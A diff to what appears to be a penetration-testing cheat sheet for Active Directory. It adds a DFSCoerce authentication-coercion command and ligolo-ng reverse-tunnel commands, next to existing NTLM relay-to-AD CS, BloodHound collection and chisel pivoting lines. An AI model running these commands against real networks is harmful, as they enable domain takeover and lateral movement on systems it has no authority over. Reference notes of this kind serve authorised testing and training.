@@ -275,7 +275,6 @@ impacket-rpcdump <ip_address>
 impacket-samrdump <ip_address>
 
 nmap -sV --script msrpc-enum -Pn <ip_address>
-nmap -p135 --script=msrpc-dcom-interface-activation <ip_address>
 
 rpcclient -U "" -N <ip_address>
     srvinfo
@@ -360,7 +359,7 @@ bloodhound-ce-python -u <user> -p <password> -d <domain> -ns <ip_address> -c All
 # rusthound-ce is the fast ALTERNATE collector on a large domain — one static Rust binary,
 # no Python chain. UPSTREAM (`cargo install rusthound-ce`), not apt; complement, not replacement:
 rusthound-ce -d <domain> -u <user>@<domain> -p <password> -i <ip_address> -z
-# NOT --dc (that's the impacket/certipy idiom): RustHound-CE takes -i/--ldapip for the DC IP, -f/--ldapfqdn for its FQDN.
+# NOT --dc (that's kerbrute's idiom; impacket/certipy use -dc-ip): RustHound-CE takes -i/--ldapip for the DC IP, -f/--ldapfqdn for its FQDN.
 # Whole-domain dump to browsable HTML + JSON + greppable TSV — the fast triage read
 # while BloodHound ingests. apt name is python3-ldapdomaindump; the binary is bare
 # ldapdomaindump (that dual name is why bootstrap's non-Kali pipx route uses the bare one):
@@ -438,6 +437,11 @@ coercer coerce -t <dc-ip> -l <your-ip> -u <user> -p <password> -d <domain> --fil
 # apt-native trigger and covers the EFSRPC vector (filter on `Efs`, not the single
 # EfsRpcOpenFileRaw method — that one is patched on a current DC).
 printerbug <domain>/<user>:<password>@<dc-ip> <your-ip>     # MS-RPRN spooler (Dementor); apt `krbrelayx` installs it as `printerbug` (no .py). coercer (below) is the apt-native multi-vector alt
+coercer coerce -t <dc-ip> -l <your-ip> -u <user> -p <password> -d <domain> --filter-protocol-name MS-DFSNM   # MS-DFSNM (DFSCoerce) — DCs ONLY
+# DFSCoerce is Wh04m1001/DFSCoerce upstream (a git clone, no apt package and no
+# `dfscoerce` binary) — coercer implements the same MS-DFSNM vector natively, which is
+# why this is the same tool again under a different protocol filter. It only works
+# against a domain controller; the EFSRPC and MS-RPRN vectors above hit any machine.
 coercer coerce -t <dc-ip> -l <your-ip> -u <user> -p <password> -d <domain>   # many vectors
 # Relay coerced DC auth to AD CS web enrollment -> DC cert (dirkjanm relay-to-ADCS):
 impacket-ntlmrelayx -t http://<ca-host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
@@ -638,6 +642,8 @@ chisel server -p 8000 --reverse                    # attacker
 ./chisel client <your-ip>:8000 R:socks             # target
 # ligolo-ng (modern, tun-based): proxy on attacker, agent on target, then `session`
 #   -> add a route to the internal subnet via the ligolo iface.
+ligolo-proxy -selfcert                             # attacker
+ligolo-agent -connect <your-ip>:<port> -ignore-cert  # target (apt `ligolo-ng` ships BOTH binaries)
 proxychains4 -q nxc smb <internal-ip>              # route tools through the SOCKS proxy
 ////////////////////////////////////////
 
